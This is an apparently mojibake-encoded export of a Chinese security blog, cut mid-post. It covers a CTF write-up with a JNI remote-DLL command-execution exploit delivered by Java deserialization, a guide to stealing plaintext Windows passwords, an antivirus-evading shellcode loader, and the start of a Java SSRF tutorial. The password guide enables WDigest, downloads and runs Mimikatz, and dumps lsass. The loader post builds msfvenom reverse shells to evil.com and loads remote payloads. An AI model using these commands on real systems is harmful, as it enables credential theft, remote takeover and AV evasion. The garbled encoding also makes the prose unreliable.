è½½dllå¯èƒ½æ¯”è¾ƒå›°éš¾ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥åˆ©ç”¨ç¨å¾®é«˜çº§ä¸€ç‚¹çš„æ–¹æ³•â€”â€”åŠ è½½å¤–éƒ¨çš„jaræ¥æ‰§è¡Œä»£ç ã€‚</p><p>æ„é€ è§ <a href="https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java" target="_blank" rel="noopener">https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java</a> (åŸºäº CommonsCollections6)</p><blockquote><p>æœ‰äº›å¸ˆå‚…ç”¨çš„ CommonsCollections5 gadget æ”¹çš„ï¼Œä½†æ˜¯ BadAttributeValueExpException åœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šæ£€æŸ¥æ˜¯å¦å¯ç”¨ JSMï¼Œå¦‚æœå¯ç”¨äº†ï¼Œåˆ™ä¸ä¼šè§¦å‘ gadget éœ€è¦çš„ toString æ–¹æ³•ï¼Œå¯¼è‡´åˆ©ç”¨å¤±è´¥ã€‚</p></blockquote><p>ä¸‹é¢è¦åŠ è½½ dllï¼Œç”¨ JNI ç»• JSMã€‚</p><p>åŒæ ·å› ä¸ºæ²¡æœ‰å†™æƒé™ï¼Œä¸” dll æ— æ³•ä¸€èµ·æ‰“åŒ…åˆ° jar é‡Œï¼Œæ‰€ä»¥è¦ä»ç½‘ç»œä¸ŠåŠ è½½ dllã€‚</p><p>è¿™é‡Œåˆ©ç”¨ <code>System.load</code> çš„ä¸€ä¸ªç‰¹æ€§â€”â€”å¯ä»¥ä½¿ç”¨ UNC è·¯å¾„ï¼ŒåŠ è½½è¿œç¨‹çš„ dllã€‚</p><p>ä¸ºä»€ä¹ˆå¯ä»¥ä½¿ç”¨ UNC å‘¢ï¼Ÿæ¥çœ‹ä¸‹ System.load çš„è°ƒç”¨è¿‡ç¨‹ã€‚</p><ol><li>System.load</li></ol><p><img src="/2019/06/26/sctf-2019-babyEoP-Writeup/1561382235958.png" alt="1561382235958"></p><p>â€‹  è°ƒç”¨äº† Runtime.getRuntime().load0</p><ol start="2"><li><p>Runtime.getRuntime().load0</p><p><img src="/2019/06/26/sctf-2019-babyEoP-Writeup/1561383875593.png" alt="1561383875593"></p></li></ol><p>â€‹  åœ¨è¿™é‡Œä¼šåˆ¤æ–­ filename æ˜¯å¦æ˜¯ä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œå¦‚æœä¸æ˜¯å°±ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œæ˜¯å°±è¿›ä¸€æ­¥åŠ è½½ã€‚</p><ol start="3"><li><p>File.isAbsolute</p><p><img src="/2019/06/26/sctf-2019-babyEoP-Writeup/1561382827270.png" alt="1561382827270"></p><p>å†çœ‹çœ‹ File æ˜¯å¦‚ä½•åˆ¤æ–­æ˜¯å¦æ˜¯ç»å¯¹è·¯å¾„çš„ã€‚</p><p>æ ¹æ®æè¿°ï¼Œlinuxä¸‹è¦æ±‚ä»¥ <code>/</code> å¼€å¤´ã€‚windowsä¸‹ï¼Œè¦æ±‚ä»¥ç›˜ç¬¦æˆ–è€… <code>\\\\</code> å¼€å¤´ã€‚</p></li></ol><p>emm ç»¼ä¸Šï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ä½¿ç”¨ UNC è·¯å¾„ã€‚</p><p>ä¸‹é¢æ˜¯å¦ä¸€ä¸ªå‘ï¼ŒUNC é»˜è®¤æ˜¯èµ° 445 ç«¯å£çš„ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šæƒ…å†µï¼Œå…¬ç½‘ä¸Šéƒ½æ˜¯å±è”½äº†è¿™ä¸ªç«¯å£çš„ã€‚</p><p>è¿™é‡Œåˆ©ç”¨ windows ä¸€ä¸ªç‰¹æ€§ï¼Œåœ¨å¼€å¯äº† webclient æœåŠ¡çš„æƒ…å†µä¸‹ï¼ŒUNC è®¿é—® 445 å¤±è´¥æ—¶ï¼Œä¼šå°è¯•è®¿é—®ç›®æ ‡æœåŠ¡å™¨80ç«¯å£çš„ webdav å»åŠ è½½èµ„æº (â€¾â—¡â—)ï¼Œ è¿™ä¸€ç‚¹ hint å·²ç»æç¤ºè¿‡äº†ã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h3 id="ç±»"><a href="#ç±»" class="headerlink" title="ç±»"></a>ç±»</h3><p>R.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">R</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">    System.load(<span class="string">"\\\\xxx.xxx.xxx.xxx\\JNI.dll"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">(String cmd)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">R</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac R.java</span><br><span class="line">jar cvf R.jar R.class</span><br></pre></td></tr></table></figure><p>å°†æ‰“åŒ…çš„ R.jar æ”¾åˆ°æœåŠ¡å™¨ä¸Šçš„ web æœåŠ¡ä¸‹ã€‚</p><h3 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h3><h4 id="R-h"><a href="#R-h" class="headerlink" title="R.h"></a>R.h</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#ifdef __cplusplus</span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line">#endif</span><br><span class="line">JNIEXPORT void JNICALL Java_R_exec</span><br><span class="line">(JNIEnv *, jclass, jstring);</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><h4 id="R-cpp"><a href="#R-cpp" class="headerlink" title="R.cpp"></a>R.cpp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;R.h&quot;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">JNIEXPORT void JNICALL Java_R_exec</span><br><span class="line">(JNIEnv *env, jclass clazz, jstring str) &#123;</span><br><span class="line">char* cmd= (char*)env-&gt;GetStringUTFChars(str,JNI_FALSE);</span><br><span class="line">system(cmd);</span><br><span class="line">env-&gt;ReleaseStringUTFChars(str,cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆ dllï¼Œæ”¾åˆ°æœåŠ¡å™¨çš„ webdav æœåŠ¡ä¸‹ã€‚</p><p>ç”¨ <a href="https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java" target="_blank" rel="noopener">https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java</a> æ„é€ åºåˆ—åŒ– payloadï¼Œè´´åˆ° cookie é‡Œæ‰“ä¸€å‘ï¼Œå®Œäº‹å„¿~</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Windowsä¸‹æŠ“å–æ˜æ–‡å¯†ç </title>
      <link href="/2019/03/29/pentest-getpassword/"/>
      <url>/2019/03/29/pentest-getpassword/</url>
      
        <content type="html"><![CDATA[<h1 id="å…³äº-KB2871997"><a href="#å…³äº-KB2871997" class="headerlink" title="å…³äº KB2871997"></a>å…³äº KB2871997</h1><p>åœ¨ <code>KB2871997</code> ä¹‹å‰ï¼Œ Mimikatz å¯ä»¥ç›´æ¥æŠ“å–æ˜æ–‡å¯†ç ã€‚</p><p>å½“æœåŠ¡å™¨å®‰è£… <code>KB2871997</code> è¡¥ä¸åï¼Œç³»ç»Ÿé»˜è®¤ç¦ç”¨ <code>Wdigest Auth</code> ï¼Œå†…å­˜ï¼ˆlsassè¿›ç¨‹ï¼‰ä¸å†ä¿å­˜æ˜æ–‡å£ä»¤ã€‚Mimikatz å°†è¯»ä¸åˆ°å¯†ç æ˜æ–‡ã€‚<br>ä½†ç”±äºä¸€äº›ç³»ç»ŸæœåŠ¡éœ€è¦ç”¨åˆ° <code>Wdigest Auth</code>ï¼Œæ‰€ä»¥è¯¥é€‰é¡¹æ˜¯å¯ä»¥æ‰‹åŠ¨å¼€å¯çš„ã€‚ï¼ˆå¼€å¯åï¼Œéœ€è¦ç”¨æˆ·é‡æ–°ç™»å½•æ‰èƒ½ç”Ÿæ•ˆï¼‰</p><p>ä»¥ä¸‹æ˜¯æ”¯æŒçš„ç³»ç»Ÿ:</p><ul><li>Windows 7</li><li>Windows 8</li><li>Windows 8.1</li><li>Windows Server 2008</li><li>Windows Server 2012</li><li>Windows Server 2012R 2</li></ul><h2 id="å¼€å¯"><a href="#å¼€å¯" class="headerlink" title="å¼€å¯"></a>å¼€å¯</h2><ul><li><p>cmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure></li><li><p>meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</span><br></pre></td></tr></table></figure></li></ul><h2 id="å…³é—­"><a href="#å…³é—­" class="headerlink" title="å…³é—­"></a>å…³é—­</h2><ul><li><p>cmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure></li><li><p>meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</span><br></pre></td></tr></table></figure></li></ul><h1 id="å¼ºåˆ¶é”å±"><a href="#å¼ºåˆ¶é”å±" class="headerlink" title="å¼ºåˆ¶é”å±"></a>å¼ºåˆ¶é”å±</h1><p>åœ¨å¼€å¯ <code>Wdigest Auth</code> åï¼Œéœ€è¦ç®¡ç†å‘˜é‡æ–°ç™»å½•æ‰èƒ½é€®åˆ°æ˜æ–‡å¯†ç ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å¼ºåˆ¶é”å±ï¼Œè®©ç®¡ç†å‘˜é‡æ–°ç™»å½•ã€‚</p><ul><li><p>cmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/kiraly15/Lock-WorkStation/master/Lock-WorkStation.ps1&apos;);&quot;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>ç»æµ‹è¯• Win10ä¼ä¸šç‰ˆ ä»…é”å±è¯»æ˜æ–‡å¤±è´¥ï¼Œéœ€è¦æ³¨é”€æ‰è¡Œï¼Œå…¶å®ƒç‰ˆæœ¬æœªçŸ¥ã€‚</p></blockquote><h1 id="æŠ“å–æ˜æ–‡"><a href="#æŠ“å–æ˜æ–‡" class="headerlink" title="æŠ“å–æ˜æ–‡"></a>æŠ“å–æ˜æ–‡</h1><p>å¼€å¯ <code>Wdigest Auth</code> åï¼Œæ¥ä¸‹æ¥å°±ç”¨å¸¸è§„çš„æŠ“å–æ˜æ–‡çš„æ–¹å¼å°±è¡Œäº†ã€‚</p><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><ol><li><p>powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz</span><br></pre></td></tr></table></figure></li><li><p>exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></li></ol><h2 id="ç¦»çº¿æŠ“å–"><a href="#ç¦»çº¿æŠ“å–" class="headerlink" title="ç¦»çº¿æŠ“å–"></a>ç¦»çº¿æŠ“å–</h2><p>å½“ <code>Mimikatz</code> è¢«æ€ï¼Œå¯ä»¥å…ˆå°† <code>lsass</code> è¿›ç¨‹ <code>dump</code> ä¸‹æ¥ï¼Œåœ¨æœ¬åœ°ç”¨ <code>Mimikatz</code> è¯»å–ã€‚</p><ol><li><p>Dump è¿›ç¨‹</p><p>å¯ä»¥ç”¨å¾®è½¯æä¾›çš„ <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener"><code>procdump</code></a> ï¼Œè‡ªå¸¦å¾®è½¯ç­¾åï¼Œå¯ä»¥è¿‡æ€è½¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure></li><li><p>Mimikatz è¯»å–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ã€GSLã€‘ ä»å†…å­˜åŠ è½½ SHELLCODE ç»•è¿‡AVæŸ¥æ€</title>
      <link href="/2019/01/08/tools-load-shellcode/"/>
      <url>/2019/01/08/tools-load-shellcode/</url>
      
        <content type="html"><![CDATA[<p>æ ¹æ® <a href="https://github.com/brimstone/go-shellcode" target="_blank" rel="noopener">go-shellcode</a> ä¿®æ”¹ï¼ŒåŸä½œè€…ç”¨å‘½ä»¤è¡Œä¼  SHELLCODE çš„æ–¹å¼æœ‰ç‚¹éº»ç“œï¼Œæ‰€ä»¥ä¿®æ”¹äº†ä¸€ç•ªã€‚</p><p>äº²æµ‹å¯ç»• 360å…¨å®¶æ¡¶ã€‚</p><p>X86 &amp; X64 çš„ SHELLCODE éƒ½å¯ä»¥ï¼Œç”¨å¯¹åº” <code>gsl</code> åŠ è½½å°±è¡Œäº†ã€‚</p><p>ä¸‹è½½ï¼šã€<a href="https://github.com/Jayl1n/jayl1n.github.io/releases/download/0.1/gsl32.exe" target="_blank" rel="noopener">X86</a>ã€‘ ã€<a href="https://github.com/Jayl1n/jayl1n.github.io/releases/download/0.1/gsl64.exe" target="_blank" rel="noopener">X64</a>ã€‘</p><blockquote><p>ä¸ºå‡å°ä½“ç§¯ï¼Œå·²ç”¨ UPX åŠ å£³å‹ç¼©ã€‚</p></blockquote><a id="more"></a><h1 id="é£Ÿç”¨æ–¹æ³•"><a href="#é£Ÿç”¨æ–¹æ³•" class="headerlink" title="é£Ÿç”¨æ–¹æ³•"></a>é£Ÿç”¨æ–¹æ³•</h1><p>é¦–å…ˆè¦å‡†å¤‡å¥½ SHELLCODEï¼Œæ”¯æŒ MSF çš„ <code>RAW</code> å’Œ <code>HEX</code> æ ¼å¼ã€‚</p><h2 id="ç”Ÿæˆ-SHELLCODE"><a href="#ç”Ÿæˆ-SHELLCODE" class="headerlink" title="ç”Ÿæˆ SHELLCODE"></a>ç”Ÿæˆ SHELLCODE</h2><h3 id="X86"><a href="#X86" class="headerlink" title="X86"></a>X86</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=evil.com LPORT=666 -f raw &gt; evil.raw</span><br></pre></td></tr></table></figure><h3 id="X64"><a href="#X64" class="headerlink" title="X64"></a>X64</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=evil.com LPORT=666 -f hex &gt; evil.hex</span><br></pre></td></tr></table></figure><h2 id="åŠ è½½-SHELLCODE"><a href="#åŠ è½½-SHELLCODE" class="headerlink" title="åŠ è½½ SHELLCODE"></a>åŠ è½½ SHELLCODE</h2><p>æœ‰ä¸‰ç§æ–¹å¼ã€‚</p><h3 id="0X01"><a href="#0X01" class="headerlink" title="0X01"></a>0X01</h3><p>ä»å‚æ•°ä¼ å…¥ <strong>ï¼ˆå¿…é¡»æ˜¯HEXæ ¼å¼ï¼‰</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsl -s SHELLCODE -hex</span><br></pre></td></tr></table></figure><h3 id="0X02"><a href="#0X02" class="headerlink" title="0X02"></a>0X02</h3><p>ä»æ–‡ä»¶ä¼ å…¥ï¼Œéœ€è¦å…ˆæŠŠ SHELLCODE æ–‡ä»¶ä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Š</p><ul><li><p>åŠ è½½ RAW æ ¼å¼</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsl -f evil.raw</span><br></pre></td></tr></table></figure></li><li><p>åŠ è½½ HEX æ ¼å¼</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsl -f evil.hex -hex</span><br></pre></td></tr></table></figure></li></ul><h3 id="0X03"><a href="#0X03" class="headerlink" title="0X03"></a>0X03</h3><p>ä»è¿œç¨‹æœåŠ¡å™¨åŠ è½½ï¼ŒæŠŠ SHELLCODE æ–‡ä»¶æŒ‚åœ¨WEBç›®å½•ä¸‹ã€‚ï¼ˆæ”¯æŒHTTP/HTTPSï¼‰</p><ul><li><p>åŠ è½½ RAW æ ¼å¼</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsl -u http://evil.com/evil.raw</span><br></pre></td></tr></table></figure></li><li><p>åŠ è½½ HEX æ ¼å¼</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsl -u http://evil.com/evil.hex -hex</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> å·¥å…·åˆ†äº« </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ä»1å¼€å§‹çš„Javaä»£ç å®¡è®¡Â·ç¬¬å››å¼¹Â·SSRF</title>
      <link href="/2018/12/30/java-audit-step-by-step-4/"/>
      <url>/2018/12/30/java-audit-step-by-step-4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æœ€è¿‘çš„äº‹æƒ…çœŸçš„å¤ªå¤šäº† <strong>â‰§ï¹â‰¦</strong> ï¼Œè¶ç€åˆšæå®Œå°ç»„çš„é¢è¯•ï¼Œå‘ç¯‡çƒ­ä¹çš„ã€‚</p></blockquote><a id="more"></a><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>è‡ªä» 2016 å¹´çŒªçŒªä¾ åœ¨ä¹Œäº‘å³°ä¼šå‘è¡¨è®®é¢˜â€”â€”<a href="https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf" target="_blank" rel="noopener">ã€ŠBuild Your SSRF Exploit Frameworkã€‹</a>ï¼Œ<code>SSRF</code> æ‰å¼€å§‹ç«èµ·æ¥çš„å§ï¼Œæ”»å‡»é¢è¶Šæ¥è¶Šå¹¿ï¼Œåˆ©ç”¨æŸäº›å¥‡æŠ€æ·«å·§å¯ä»¥ç›´æ¥GETSHELLã€‚</p><p><code>SSRF</code> çš„ä»‹ç»ã€åˆ©ç”¨æ–¹å¼ï¼ŒPDFé‡Œéƒ½æœ‰è®²ï¼Œå°±ä¸å†èµ˜è¿°äº†ï¼Œå¼€å§‹è¿›å…¥æ­£é¢˜ã€‚</p><h1 id="æ”¯æŒçš„åè®®"><a href="#æ”¯æŒçš„åè®®" class="headerlink" title="æ”¯æŒçš„åè®®"></a>æ”¯æŒçš„åè®®</h1><p>Java æ”¯æŒçš„åè®®å¯ä»¥åœ¨ <code>sum.net.www.protocol</code> åŒ…ä¸‹çœ‹åˆ°ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="/2018/12/30/java-audit-step-by-step-4/java-protocol.png" alt="java-protocol"></p><p>å›¾ä¸­ç”¨çš„ JDK æ˜¯ <code>1.7</code>ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ <code>gopher</code> <code>file</code> <code>ftp</code> <code>http</code> <code>https</code> <code>jar</code> <code>mailto</code> <code>netdoc</code> å…«ç§åè®®ã€‚å…¶ä¸­æœ€æœ‰æ„æ€çš„æ˜¯ <code>gopher</code> åè®®ï¼Œå¯ä»¥ç”¨æ¥æ„é€ å…¶å®ƒåè®®çš„è¯·æ±‚ã€‚ä½†æ˜¯ï¼Œ<strong><code>gopher</code> åœ¨ <code>JDK8</code> ä¸­å·²ç»è¢«ç§»é™¤ã€‚</strong> ç»è¿‡æµ‹è¯•ï¼Œåœ¨é«˜ç‰ˆæœ¬çš„ <code>JDK7</code> é‡Œï¼Œè™½ç„¶ <code>sun.net.www.protoocol</code> ä¸­è¿˜æœ‰ <code>gopher</code> åŒ…ï¼Œä½†æ˜¯å®é™…ä¹Ÿå·²ç»ä¸èƒ½ä½¿ç”¨ï¼Œä¼šæŠ› <code>java.net.MalformedURLException: unknown protocol: gopher</code> çš„å¼‚å¸¸ï¼Œè¢«é˜‰å‰²åœ°æ—¶é—´åœ¨2012å¹´å·¦å³ï¼ˆFrom <a href="http://www.k0rz3n.com" target="_blank" rel="noopener">@K0rz3n</a>ï¼‰ã€‚</p><h1 id="å‘èµ·è¯·æ±‚çš„æµç¨‹"><a href="#å‘èµ·è¯·æ±‚çš„æµç¨‹" class="headerlink" title="å‘èµ·è¯·æ±‚çš„æµç¨‹"></a>å‘èµ·è¯·æ±‚çš„æµç¨‹</h1><p>æ„é€ ä¸€ä¸ªç®€å•çš„ <code>http</code> è¯·æ±‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">    URLConnection urlConnection = u.openConnection();</span><br><span class="line">    InputStream inputStream = urlConnection.getInputStream();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€è¿°ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼Œé¦–å…ˆï¼Œæ„é€ ä¸€ä¸ª <code>URL</code> å¯¹è±¡ï¼Œè°ƒç”¨ <code>url</code> çš„ <code>openConnection()</code> æ–¹æ³•æ¥è·å–ä¸€ä¸ª <code>URLConnection</code> å®ä¾‹ï¼Œç„¶åå†è°ƒ <code>getInputStream()</code> æ‹¿åˆ° <code>InputStream</code>ï¼Œä¹Ÿå°±æ˜¯è¯·æ±‚çš„å“åº”æµã€‚ä¹‹åï¼Œå†åšæˆ‘ä»¬æƒ³è¦çš„å…¶å®ƒäº‹æƒ…ã€‚</p><p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœ <code>URL</code> æ˜¯å¯æ§çš„ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨ <code>SSRF</code> æ¼æ´ã€‚</p><p>ä¸‹é¢åˆ†æä¸‹ä¸»è¦çš„å‡ ä¸ªæ–¹æ³•ã€‚</p><h2 id="new-URL"><a href="#new-URL" class="headerlink" title="new URL()"></a>new URL()</h2><p>æ„é€ ä¸€ä¸ª <code>URL</code> å¯¹è±¡ï¼Œæ„é€ æ—¶ï¼Œå¯ä»¥æŒ‡å®š <code>åè®®</code>ï¼Œ<code>HOST</code>ï¼Œ<code>ç«¯å£</code>ï¼Œ<code>æ–‡ä»¶è·¯å¾„</code>ï¼Œ<code>URLStreamHandler</code>ã€‚</p><p>å…¶ä¸­ï¼Œ<code>URLStreamHandler</code> æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ¯ä¸ªåè®®éƒ½æœ‰ç»§æ‰¿å®ƒçš„å­ç±» â€”â€” <code>Handler</code>ï¼ˆå¯ä»¥åœ¨å„åè®®çš„åŒ…ä¸‹æ‰¾åˆ°ï¼‰ã€‚<code>Handler</code> å®šä¹‰äº†è¯¥å¦‚ä½•å»æ‰“å¼€ä¸€ä¸ªè¿æ¥ï¼ˆ <code>openConnection()</code> ï¼‰ã€‚</p><p>å¦‚æœæ˜¯ç›´æ¥ä¼ å…¥ä¸€ä¸ª <code>URL</code> å­—ç¬¦ä¸²ï¼Œä¼šåœ¨æ„é€ å¯¹è±¡æ—¶ï¼Œæ ¹æ® <code>protocol</code> è‡ªåŠ¨åˆ›å»ºå¯¹åº”çš„ <code>Handler</code> å¯¹è±¡ã€‚</p><h2 id="openConnection"><a href="#openConnection" class="headerlink" title="openConnection()"></a>openConnection()</h2><p>æ¯æ¬¡è°ƒç”¨ <code>openConnection()</code> æ—¶ï¼Œéƒ½ä¼šåˆ›é€ ä¸€ä¸ªæ–°çš„å®ä¾‹ï¼Œä¹Ÿå°±æ˜¯ <code>URLConnection</code>ã€‚ä½†æ˜¯ï¼Œ<strong>åœ¨å®ä¾‹åˆ›å»ºæ—¶ï¼ŒçœŸå®çš„ç½‘ç»œè¿æ¥å®é™…ä¸Šå¹¶æ²¡æœ‰å»ºç«‹</strong>ã€‚åªæœ‰åœ¨è°ƒç”¨ <code>URLConnection.connect()</code> æ–¹æ³•åæ‰ä¼šå»ºç«‹è¿æ¥ã€‚</p><h2 id="getInputStream"><a href="#getInputStream" class="headerlink" title="getInputStream()"></a>getInputStream()</h2><p>ä»æ‰“å¼€çš„è¿æ¥è·å–ä¸€ä¸ª <code>InputStream</code>ï¼Œå¯ä»¥ä»ä¸­å¾—åˆ° <code>URL</code> è¯·æ±‚çš„å“åº”æµã€‚åœ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ <code>URLConnection.connect()</code> æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯å»ºç«‹è¿æ¥ã€‚æ‰€ä»¥ä¸€æ—¦è°ƒç”¨ <code>getInputStream()</code> è¿æ¥å°±å·²ç»å»ºç«‹å¥½äº†ï¼Œä¸ç®¡åç»­åšä»€ä¹ˆæ“ä½œï¼Œè¿™ä¸ª <code>URL</code> 